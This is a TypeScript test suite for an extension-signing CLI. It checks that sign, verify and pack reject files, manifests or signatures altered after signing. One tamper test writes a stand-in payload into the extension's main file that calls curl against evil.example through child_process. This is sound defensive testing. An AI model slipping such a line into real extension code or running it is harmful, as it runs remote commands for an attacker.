// `sprintengine-extension sign` records the digest of every file an extension
// ships in extension.sig, extension.json included, and `verify` and `pack`
// hold the folder to them. Run as a real subprocess (bundled from source with
// esbuild, as cli-roundtrip.test.ts does), then read back through the SDK's
// own signature checks, so the CLI and Studio are checked against the same
// bytes.

import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { buildSync } from 'esbuild'
import { afterAll, beforeAll, test } from 'vitest'

import { EXTENSION_MANIFEST_SINCE } from '../src/extension-manifest.js'
import {
  computeModuleFileDigestsSync,
  generateModuleSigningKeyPair,
  moduleFileDigestIssuesSync,
  parseExtensionSignature,
  verifyExtensionSignature,
} from '../src/signing.js'

let workDir = ''
let cliBundle = ''
let keyPath = ''
let fixtureCount = 0

beforeAll(() => {
  workDir = mkdtempSync(join(tmpdir(), 'sprintengine-cli-module-files-'))
  cliBundle = join(workDir, 'sprintengine-extension.cjs')
  buildSync({
    entryPoints: [join(process.cwd(), 'packages/extension-sdk/src/cli.ts')],
    bundle: true,
    platform: 'node',
    format: 'cjs',
    outfile: cliBundle,
    logLevel: 'silent',
  })
  keyPath = join(workDir, 'signing.key')
  assert.equal(runCli(['keygen', '--out', keyPath]).status, 0)
})

afterAll(() => {
  rmSync(workDir, { recursive: true, force: true })
})

function runCli(args: string[]): { status: number | null; stdout: string; stderr: string } {
  const { status, stdout, stderr } = spawnSync(process.execPath, [cliBundle, ...args], {
    cwd: workDir,
    encoding: 'utf8',
  })
  return { status, stdout, stderr }
}

// An extension folder the way an author has one: its manifest, code, a nested
// asset, a node_modules and a stray key that pack will leave out.
function writeExtensionSource(): string {
  const dir = join(workDir, `extension-${fixtureCount++}`)
  mkdirSync(join(dir, 'dist', 'assets'), { recursive: true })
  mkdirSync(join(dir, 'node_modules', 'left-pad'), { recursive: true })
  writeFileSync(
    join(dir, 'extension.json'),
    JSON.stringify({
      manifestVersion: 1,
      id: 'files-fixture',
      version: '1.0.0',
      engines: { studio: `>=${EXTENSION_MANIFEST_SINCE}` },
      tier: 'worker',
      name: 'Files fixture',
      icon: 'dist/assets/icon.svg',
      main: 'dist/main.cjs',
    }),
  )
  writeFileSync(join(dir, 'dist', 'main.cjs'), 'exports.activate = () => {}\n')
  writeFileSync(join(dir, 'dist', 'assets', 'icon.svg'), '<svg/>\n')
  writeFileSync(join(dir, 'node_modules', 'left-pad', 'index.js'), 'module.exports = 1\n')
  writeFileSync(join(dir, 'author.key'), 'not really a key')
  return dir
}

function readSignature(dir: string) {
  const parsed = parseExtensionSignature(readFileSync(join(dir, 'extension.sig'), 'utf8'))
  assert.ok(parsed.ok, parsed.ok ? '' : parsed.message)
  if (!parsed.ok) throw new Error('unreachable')
  return parsed.signature
}

test('sign records the digest of every file pack ships, extension.json included', () => {
  const dir = writeExtensionSource()
  const signed = runCli(['sign', dir, '--key', keyPath])
  assert.equal(signed.status, 0, signed.stderr)
  assert.match(signed.stdout, /Signed files-fixture and 3 file\(s\)/)

  const signature = readSignature(dir)
  assert.deepEqual(Object.keys(signature.files), ['dist/assets/icon.svg', 'dist/main.cjs', 'extension.json'])
  assert.match(signature.files['dist/main.cjs'] ?? '', /^[0-9a-f]{64}$/)
  assert.equal(verifyExtensionSignature(signature).valid, true)
  // The manifest itself is untouched: the signature lives beside it.
  assert.equal(JSON.parse(readFileSync(join(dir, 'extension.json'), 'utf8')).signature, undefined)

  const verified = runCli(['verify', dir])
  assert.equal(verified.status, 0, verified.stderr)
  assert.match(verified.stdout, /3 file\(s\) match/)
  assert.ok(verified.stdout.includes(verifyExtensionSignature(signature).fingerprint!))
})

test('a packed signed extension verifies, and matches what Studio digests', () => {
  const dir = writeExtensionSource()
  assert.equal(runCli(['sign', dir, '--key', keyPath]).status, 0)
  const outDir = join(workDir, `packed-${fixtureCount++}`)
  const packed = runCli(['pack', dir, '--out', outDir])
  assert.equal(packed.status, 0, packed.stderr)
  assert.match(packed.stdout, /Packed files-fixture 1\.0\.0 \(signed\)/)
  assert.equal(existsSync(join(outDir, 'node_modules')), false)
  assert.equal(existsSync(join(outDir, 'author.key')), false)
  assert.equal(runCli(['verify', outDir]).status, 0)

  // The installed walk (Studio's) finds exactly the signed files in the pack.
  const signature = readSignature(outDir)
  const installed = computeModuleFileDigestsSync(outDir)
  assert.ok(installed.ok, installed.ok ? '' : JSON.stringify(installed.issues))
  assert.deepEqual(moduleFileDigestIssuesSync(outDir, signature.files), [])
})

test('verify and pack refuse a code file changed after signing', () => {
  const dir = writeExtensionSource()
  assert.equal(runCli(['sign', dir, '--key', keyPath]).status, 0)
  writeFileSync(join(dir, 'dist', 'main.cjs'), "require('child_process').exec('curl https://evil.example')\n")

  const verified = runCli(['verify', dir])
  assert.equal(verified.status, 1)
  assert.match(verified.stderr, /does not match the file digests extension\.sig signs/)
  assert.match(verified.stderr, /files\.dist\/main\.cjs: does not match the signed digests/)

  const packed = runCli(['pack', dir, '--out', join(workDir, `packed-${fixtureCount++}`)])
  assert.equal(packed.status, 1)
  assert.match(packed.stderr, /changed after signing/)
})

test('verify refuses an extension.json edited after signing', () => {
  const dir = writeExtensionSource()
  assert.equal(runCli(['sign', dir, '--key', keyPath]).status, 0)
  const manifest = JSON.parse(readFileSync(join(dir, 'extension.json'), 'utf8'))
  writeFileSync(join(dir, 'extension.json'), JSON.stringify({ ...manifest, name: 'Something else' }))
  const verified = runCli(['verify', dir])
  assert.equal(verified.status, 1)
  assert.match(verified.stderr, /files\.extension\.json: does not match the signed digests/)
})

test('verify refuses a file added after signing', () => {
  const dir = writeExtensionSource()
  assert.equal(runCli(['sign', dir, '--key', keyPath]).status, 0)
  writeFileSync(join(dir, 'dist', 'extra.cjs'), 'module.exports = 1\n')
  const verified = runCli(['verify', dir])
  assert.equal(verified.status, 1)
  assert.match(verified.stderr, /files\.dist\/extra\.cjs: is not listed in the signed digests/)
})

test('verify refuses an extension.sig whose digests were edited, or that another key signed', () => {
  const dir = writeExtensionSource()
  assert.equal(runCli(['sign', dir, '--key', keyPath]).status, 0)
  const sigPath = join(dir, 'extension.sig')
  const signature = readSignature(dir)

  // Digests re-written to match a changed file: the signature no longer covers them.
  writeFileSync(join(dir, 'dist', 'main.cjs'), 'exports.activate = () => { /* changed */ }\n')
  const current = computeModuleFileDigestsSync(dir, { walk: 'pack' })
  assert.ok(current.ok)
  writeFileSync(sigPath, JSON.stringify({ ...signature, files: current.files }))
  const edited = runCli(['verify', dir])
  assert.equal(edited.status, 1)
  assert.match(edited.stderr, /INVALID signature/)

  // A key swapped in beside the old signature.
  writeFileSync(sigPath, JSON.stringify({ ...signature, publicKey: generateModuleSigningKeyPair().publicKeyB64 }))
  const swapped = runCli(['verify', dir])
  assert.equal(swapped.status, 1)
  assert.match(swapped.stderr, /INVALID signature/)

  // Not an extension.sig at all.
  writeFileSync(sigPath, JSON.stringify({ ...signature, algorithm: 'ed25519' }))
  const malformed = runCli(['verify', dir])
  assert.equal(malformed.status, 1)
  assert.match(malformed.stderr, /a field Studio does not read: algorithm/)
})

test('verify says an unsigned extension is unsigned', () => {
  const verified = runCli(['verify', writeExtensionSource()])
  assert.equal(verified.status, 1)
  assert.match(verified.stderr, /files-fixture is unsigned/)
})

test('sign refuses an extension with a symbolic link in it', () => {
  const dir = writeExtensionSource()
  writeFileSync(join(workDir, `outside-${fixtureCount}.cjs`), 'module.exports = 1\n')
  symlinkSync(join(workDir, `outside-${fixtureCount}.cjs`), join(dir, 'dist', 'linked.cjs'))
  const signed = runCli(['sign', dir, '--key', keyPath])
  assert.equal(signed.status, 1)
  assert.match(signed.stderr, /files\.dist\/linked\.cjs: is a symbolic link/)
  assert.equal(existsSync(join(dir, 'extension.sig')), false)
})

test('sign and pack refuse a file extension.json names that the extension does not contain', () => {
  const dir = writeExtensionSource()
  rmSync(join(dir, 'dist', 'main.cjs'))
  const signed = runCli(['sign', dir, '--key', keyPath])
  assert.equal(signed.status, 1)
  assert.match(signed.stderr, /main: names "dist\/main\.cjs", which is not in the extension/)
  const packed = runCli(['pack', dir, '--out', join(workDir, `packed-${fixtureCount++}`)])
  assert.equal(packed.status, 1)
  assert.match(packed.stderr, /main: names "dist\/main\.cjs", which does not exist/)
})
